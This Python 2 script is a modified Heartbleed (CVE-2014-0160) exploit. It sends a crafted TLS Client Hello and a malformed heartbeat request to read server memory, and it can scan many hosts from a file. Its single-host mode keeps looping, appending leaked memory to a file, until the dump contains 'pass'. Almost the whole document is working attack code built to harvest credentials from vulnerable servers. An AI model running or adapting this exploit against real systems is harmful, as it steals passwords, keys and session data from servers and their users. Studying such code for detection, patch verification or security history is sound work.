#!/usr/bin/python

#Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
#The author disclaims copyright to this source code.

#Modified for simplified checking by Yonathan Klijnsma
#Modified for multiple hosts by hap.ddup

#http://seclists.org/fulldisclosure/2014/Apr/94
#http://blog.fox-it.com/2014/04/08/openssl-heartbleed-bug-live-blog/

#------------------------------------------------
#
#OpenSSL versions 1.0.1 -- 1.0.1f are vulnerable
#
#------------------------------------------------

#importsys
import struct
import socket
import time
import select
import os
import re
#importre
from  optparse import OptionParser

#target= None

#options= OptionParser(usage='%prog server [options]', description='Test for SSLheartbeat vulnerability (CVE-2014-0160)')
#options.add_option('-p','--port', type='int', default=443, help='TCP port to test (default: 443)')
#options.add_option('-d','--dest', type='string',dest='host', help='HOST to test')
#options.add_option('-f','--file', type='string',dest='filename', help='Hosts in the FILE to test ')

def h2bin(x):
    return x.replace(' ', '').replace('\n','').decode('hex')

#----------TLSv1---[Client Hello]--------------
#SecureSockets Layer
#    TLSv1.1 Record Layer: Handshake Protocol:Client Hello
#        Content Type: Handshake (22)
#        Version: TLS 1.1 (0x0302)
#        Length: 220
#        Handshake Protocol: Client Hello
#            Handshake Type: Client Hello (1)
#            Length: 216
#            Version: TLS 1.1 (0x0302)
#            Random
#            Session ID Length: 0
#            Cipher Suites Length: 102
#            Cipher Suites (51 suites)
#                Cipher Suite:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)
#                Cipher Suite:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)
#                Cipher Suite:TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA (0xc022)
#                Cipher Suite:TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA (0xc021)
#                Cipher Suite:TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x0039)
#                Cipher Suite:TLS_DHE_DSS_WITH_AES_256_CBC_SHA (0x0038)
#                Cipher Suite:TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA (0x0088)
#                Cipher Suite:TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA (0x0087)
#                Cipher Suite:TLS_ECDH_RSA_WITH_AES_256_CBC_SHA (0xc00f)
#                Cipher Suite:TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA (0xc005)
#                Cipher Suite:TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)
#                Cipher Suite:TLS_RSA_WITH_CAMELLIA_256_CBC_SHA (0x0084)
#                Cipher Suite:TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (0xc012)
#                Cipher Suite:TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc008)
#                Cipher Suite:TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA (0xc01c)
#                Cipher Suite:TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA (0xc01b)
#                Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA(0x0016)
#                Cipher Suite:TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA (0x0013)
#                Cipher Suite:TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA (0xc00d)
#                Cipher Suite:TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA (0xc003)
#                Cipher Suite:TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)
#                Cipher Suite:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)
#                Cipher Suite:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)
#                Cipher Suite:TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA (0xc01f)
#                Cipher Suite:TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA (0xc01e)
#                Cipher Suite:TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x0033)
#                Cipher Suite:TLS_DHE_DSS_WITH_AES_128_CBC_SHA (0x0032)
#                Cipher Suite:TLS_DHE_RSA_WITH_SEED_CBC_SHA (0x009a)
#                Cipher Suite:TLS_DHE_DSS_WITH_SEED_CBC_SHA (0x0099)
#                Cipher Suite:TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA (0x0045)
#                Cipher Suite:TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA (0x0044)
#                Cipher Suite:TLS_ECDH_RSA_WITH_AES_128_CBC_SHA (0xc00e)
#                Cipher Suite:TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA (0xc004)
#                Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA(0x002f)
#                Cipher Suite:TLS_RSA_WITH_SEED_CBC_SHA (0x0096)
#                Cipher Suite:TLS_RSA_WITH_CAMELLIA_128_CBC_SHA (0x0041)
#                Cipher Suite:TLS_ECDHE_RSA_WITH_RC4_128_SHA (0xc011)
#                Cipher Suite:TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (0xc007)
#                Cipher Suite:TLS_ECDH_RSA_WITH_RC4_128_SHA (0xc00c)
#                Cipher Suite:TLS_ECDH_ECDSA_WITH_RC4_128_SHA (0xc002)
#                Cipher Suite:TLS_RSA_WITH_RC4_128_SHA (0x0005)
#                Cipher Suite:TLS_RSA_WITH_RC4_128_MD5 (0x0004)
#                Cipher Suite:TLS_DHE_RSA_WITH_DES_CBC_SHA (0x0015)
#                Cipher Suite:TLS_DHE_DSS_WITH_DES_CBC_SHA (0x0012)
#                Cipher Suite:TLS_RSA_WITH_DES_CBC_SHA (0x0009)
#                Cipher Suite:TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA (0x0014)
#                Cipher Suite:TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA (0x0011)
#                Cipher Suite:TLS_RSA_EXPORT_WITH_DES40_CBC_SHA (0x0008)
#                Cipher Suite:TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5 (0x0006)
#                Cipher Suite:TLS_RSA_EXPORT_WITH_RC4_40_MD5 (0x0003)
#                Cipher Suite:TLS_EMPTY_RENEGOTIATION_INFO_SCSV (0x00ff)
#            Compression Methods Length: 1
#            Compression Methods (1 method)
#            Extensions Length: 73
#            Extension: ec_point_formats
#            Extension: elliptic_curves
#            Extension: SessionTicket TLS
#            Extension: Heartbeat


hello = [
            # TLSv1.1 Record Layer : HandshakeProtocol: Client Hello
"16"        # Content Type: Handshake (22)
"0302"     #  Version: TLS 1.1 (0x0302)
"00dc"     #  Length: 220
            # Handshake Protocol: Client Hello
"01"        # Handshake Type: Client Hello (1)
"0000 d8"  #  Length (216)
"0302"     #  Version: TLS 1.1 (0x0302)
            # Random
"5343 5b 90"  # gmt_unix_time
"9d9b 72 0b bc  0c bc 2b 92 a8 48 97 cf bd39 04 cc 16 0a 85 03  90 9f 77 04 33 d4de" # random_bytes
"00"        # Session ID Length: 0
"0066"     # Cipher Suite Length: 102
            # Cipher Suites
"c014"
"c00a"
"c022"
"c021"
"0039"
"0038"
"0088"
"0087"
"c00f"
"c005"
"0035"
"0084"
"c012"
"c008"
"c01c"
"c01b"
"0016"
"0013"
"c00d"
"c003"
"000a"
"c013"
"c009"
"c01f"
"c01e"
"0033"
"0032"
"009a"
"0099"
"0045"
"0044"
"c00e"
"c004"
"002f"
"0096"
"0041"
"c011"
"c007"
"c00c"
"c002"
"0005"
"0004"
"0015"
"0012"
"0009"
"0014"
"0011"
"0008"
"0006"
"0003"
"00ff"
"01"      #Compression Methods
          # Compression Methods (1 method)
"00"        # Compression Method: null
"0049"   # Extension Length: 73
"000b"     # Type: ec_point_formats
"0004"     # Length: 4
"03"        # EC point formats length: 3
            # Elliptic curves point formats
"00"          # EC point format: uncompressed (0)
"01"          # EC point format:ansix962_compressed_prime
"02"          # EC point format:ansix962_compressed_char2
            # Extension: elliptic_curves
"000a"
"0034"
"0032"
"000e"
"000d"
"0019"
"000b"
"000c"
"0018"
"0009"
"000a"
"0016"
"0017"
"0008"
"0006"
"0007"
"0014"
"0015"
"0004"
"0005"
"0012"
"0013"
"0001"
"0002"
"0003"
"000f"
"0010"
"0011"
"0023 00 00"     # Extension:SeesionTicket TLS
"000f 00 01 01"  # Extension:Heartbeat
]

#---------TLSv1---[Heartbeat Request]------------
hb = [
          # TLSv1.1 Record Layer: HeartbeatRequest
"18"      # Content Type: Heartbeat (24) ----(0x18)
"0302"   # Version: TLS 1.1 (0x0302)
"0003"   # Heartbeat Message:
"01"      #   Type: Request (1) (0x01)
"FFFF"   #    Payload Length: (16384) (0x4000)
]

hello = hello[0].replace("","").replace("\n","")
hb = hb[0].replace("","").replace("\n","")

def hexdump(s,target):
    #filename = '<'+ target + '>' +time.strftime('%m-%d %H:%M',time.localtime(time.time()))
    filename = '<'+ target + '>'
    dumpfile = open(filename,'a')
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c)<= 126 else '.' )for c in lin)
        #pdat = ''.join(c for c in lin)
        if '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' in hxdat:
	     continue
        print ' %04x: %-48s %s' % (b, hxdat, pdat)
	dumpfile.write(pdat)
    dumpfile.close

def recvall(s, length, timeout,target):
   # endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        #rtime = endtime - time.time()
        #if rtime < 0:
        #   return None
        r, w, e = select.select([s], [], [], 5)
        print 'read: ', r
        if s in r:
            data = s.recv(remain)

            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    hexdump(rdata,target)
    return rdata


def recvmsg(s,target):
    hdr = recvall(s,5,5,target)  # recvall(s, 5, timeout=5)

    if hdr is None:
        return None, None, None
    # C     ---- [big-edition] + [unsigned char] + [unsigned short] + [unsigned short]
    # Python ---- [big-edition] + integer +integer + integer
    # [Content Type] + [Version] + [Length]
    typ, ver, ln = struct.unpack('>BHH',hdr)
    print ln
    pay = recvall(s, ln, 100,target)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def hit_hb(s, target):
    #global target
    s.send(h2bin(hb))
    while True:
        print "[+] receive data..."
        typ, ver, pay = recvmsg(s,target)
        if typ is None:
            print "[-] %s |NOTVULNERABLE" % target
            return False

        # TLSv1.1 Record Layer: EncryptedHeartbeat
        # Content Type: Heartbeat (24)
        # Version: TLS 1.1 (0x0302)
        # Length: 19
        # Encrypted Heartbeat Message
        if typ == 24:
            if len(pay) > 3:
                print "[*] %s |VULNERABLE1" %target
            else:
                print "[-] %s |NOTVULNERABLE" % target

        if typ == 21:
            print "[-] %s |NOTVULNERABLE" % target
            return False

def ssltest(target, port):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(h2bin(hello))

    while True:
        typ, ver, pay = recvmsg(s,target)
        if typ == None:
            return
        print 'Look for server hello done message.'
        # typ == 22 ----> Handshake
        #
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    # sys.stdout.flush()
    print "[+] send payload: %s" % hb
    s.send(h2bin(hb))  # Malformed Packet
    return hit_hb(s, target)  # ------------- *********


def main():
    #global target
    options = OptionParser(usage='%prog server[options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
    options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
    options.add_option('-d', '--dest', dest='host', help='HOST to test')
    options.add_option('-f', '--file', dest='filename', help='Hosts in the FILE to test ')
    (opts, args) = options.parse_args()
    #print (opts, args)

    #if len(args) < 1:
    #   options.print_help()
    #   return

    if opts.host:
     while True:
      ssltest(opts.host, opts.port)
      filename = '<'+opts.host+'>'
      fileline = open(filename,'r').readlines()
      find= re.findall(r'pass',fileline[0])
      if len(find) is not 0:
       print 'Got pass !!!!!!!!!!!!!!!!!!!'
       return
      else :
       os.remove(filename)

    if opts.filename:
        hostfile=open(opts.filename,'r').readlines()
        for host in hostfile:
            host = host.strip()
            if len(host) > 3: # x.x
                ssltest(host, opts.port)
        return

    if len(args) < 1:
        options.print_help()
        return

if __name__ == '__main__':
    main()
